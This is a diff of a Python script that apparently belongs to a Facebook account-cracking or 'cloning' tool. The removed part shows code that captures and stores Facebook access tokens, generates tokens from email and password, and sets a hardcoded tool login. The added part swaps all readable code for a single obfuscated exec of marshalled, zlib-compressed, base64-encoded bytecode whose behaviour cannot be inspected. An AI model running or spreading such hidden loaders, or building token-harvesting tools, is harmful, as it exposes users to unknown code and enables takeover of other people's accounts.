@@ -1,748 +1,99 @@
-#!/usr/bin/python2
-#coding=utf-8
-#The Credit For This Code Goes To Binyamin
-#If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
 
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
 
 
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
-def keluar():
-	print "\x1b[1;91mExit"
-	os.sys.exit()
 
 
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
 
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.05)
-def tokenz():
-	os.system('clear')
-	print logo
-	toket = raw_input("\033[1;97m[+] Token :")
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		zedd = open("login.txt", 'w')
-		zedd.write(toket)
-		zedd.close()
-		menu()
-	except KeyError:
-		print "\033[1;91m[!] Wrong"
-		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
-		if e =="":
-			keluar()
-		elif e =="y":
-			login()
-		else:
-			keluar()
-
-def get(data):
-	print '[*] Generate access token '
-
-	try:
-		os.mkdir('cookie')
-	except OSError:
-		pass
-
-	b = open('cookie/token.log','w')
-	try:
-		r = requests.get('https://api.facebook.com/restserver.php',params=data)
-		a = json.loads(r.text)
-
-		b.write(a['access_token'])
-		b.close()
-		print '[*] successfully generate access token'
-		print '[*] Your access token is stored in cookie/token.log'
-		menu()
-	except KeyError:
-		print '[!] Failed to generate access token'
-		print '[!] Check your connection / email or password'
-		os.remove('cookie/token.log')
-		menu()
-	except requests.exceptions.ConnectionError:
-		print '[!] Failed to generate access token'
-		print '[!] Connection error !!!'
-		os.remove('cookie/token.log')
-		menu()
-
-def phone():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')		
-
-#Dev:Binyamin-jan
-##### LOGO #####
-logo = """
-
-\033[1;91m─────────█████
-\033[1;92m────────████████───█████
-\033[1;93m────────██████████████████
-\033[1;94m────────████████████████████
-\033[1;95m───────────██████████████████
-\033[1;96m──────────────████████████████
-\033[1;97m──────────────██████████████████
-\033[1;97m──────────────███████████████████
-\033[1;96m──────────────████████████████████
-\033[1;95m───────────────███─███████████████
-\033[1;94m───────────────███──██████████████
-\033[1;93m────────────────███───████████████
-\033[1;92m────────────────███──█████████████
-\033[1;91m────────────────███──█████████████
-\033[1;91m────────────────███─██████████████
-\033[1;92m────────────────███─██████████████
-\033[1;93m────────────────██──██████████████
-\033[1;94m────────────────██─███████──██████
-\033[1;95m───────────────██████████────█████
-\033[1;96m──────────███─██████████─────█████
-\033[1;97m─────███─█████████─█████──────█████
-\033[1;97m───████████████─█──█████───────████
-\033[1;96m──█████████████────█████───────█████
-\033[1;95m─███████████████────████───────█████
-\033[1;94m─███████████████────████────────█████
-\033[1;93m─████████████───────████────────█████
-\033[1;92m──██████████────────████─────────████
-\033[1;91m───████████─────────█████────────█████
-\033[1;92m─────█████─────────█████──────────████
-\033[1;93m─────────────────███████──────────████
-\033[1;94m───────────────███████  
-\033[1;95m
-\033[1;96m
-\033[1;97m
-\033[1;98m•-----------------\033[1;37mBinyamin\033[1;97m-----------------•
- \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mAuthor Name: Binyamin_jan ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mtel @binyamin001→+ ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mYT Channal:binyamin jan ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡ \033[1;37mFrom: Afghanistan ⚡⚡\033[1;37m]\033[1;0m
-\033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•
-"""
-
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\x1b[1;93mBinyamin█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
-
-
-back = 0
-berhasil = []
-cekpoint = []
-oks = []
-id = []
-listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-
-os.system("clear")
-print  """
-\033[1;91m───▄▀▀▀▀▀───▄█▀▀▀█▄
-\033[1;92m──▐▄▄▄▄▄▄▄▄██▌▀▄▀▐██
-\033[1;93m──▐▒▒▒▒▒▒▒▒███▌▀▐███
-\033[1;94m───▌▒▓▒▒▒▒▓▒██▌▀▐██
-\033[1;95m───▌▓▐▀▀▀▀▌▓─▀▀▀▀▀  
-\033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;97m•───────────────────────────────────────────•
-\033[1;91m─────█─▄▀█──█▀▄─█─────\033[1;97m─────█─▄▀█──█▀▄─█───── 
-\033[1;91m────▐▌──────────▐▌────\033[1;97m────▐▌──────────▐▌────
-\033[1;91m────█▌▀▄──▄▄──▄▀▐█────\033[1;97m────█▌▀▄──▄▄──▄▀▐█────
-\033[1;91m───▐██──▀▀──▀▀──██▌───\033[1;97m───▐██──▀▀──▀▀──██▌───
-\033[1;91m──▄████▄──▐▌──▄████▄──\033[1;97m──▄████▄──▐▌──▄████▄──    
-\033[1;97m•───────────────────────────────────────────•                                                                                                                             
-\033[1;96m─╔╗╔═╗╔╦╗╔═╗╔═╗     
-\033[1;96m─║║║║║║╔╝║╦╝║╬║     
-\033[1;97m╔╣║║║║║╚╗║╩╗║╗╣     
-\033[1;97m╚═╝╚═╝╚╩╝╚═╝╚╩╝     
- \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
- """
-CorrectUsername = "juttsahb"
-CorrectPassword = "alijutt"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Binyamin
-	    time.sleep(2)
-            loop = 'false'
-        else:
-            print "\033[1;97mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
-    else:
-        print "\033[1;97mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
-
-##### LICENSE #####
-#=================#
-def lisensi():
-	os.system('clear')
-	login()
-####login#########
-def login():
-	os.system('clear')
-	print logo
-	print "\033[1;91m[1]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
-        time.sleep(0.05)
-        print "\033[1;92m[2]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
-        time.sleep(0.05)
-        print "\033[1;93m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
-        time.sleep(0.05)
-        print "\033[1;94m[4]\033[1;47m\033[1;31mSubscribe YouTube Channel        \033[1;0m"
-        time.sleep(0.05)
-	print "\033[1;95m[5]\033[1;47m\033[1;31mmesseage telegram for help           \033[1;0m"
-        time.sleep(0.05)
-        print "\033[1;96m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
-	time.sleep(0.05)
-	pilih_login()
-
-def pilih_login():
-	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
-	if peak =="":
-		print "\x1b[1;91mFill in correctly"
-		pilih_login()
-	elif peak =="1":
-		login1()
-        elif peak =="2":
-	        tokenz()
-        elif peak =="3":
-	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
-	        login()
-        elif peak =="4":
-	        os.system('xdg-open https://youtu.be/5CHTnjNAiqM')
-	        login()
-        elif peak =="5":
-	        os.system('xdg-open https://www.t.me/binyamin001')
-                login()
-	elif peak =="0":
-		keluar()
-        else:
-		print"\033[1;91m[!] Wrong input"
-		keluar()
-
-def login1():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-                time.sleep(0.05)
-		print logo                
-		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
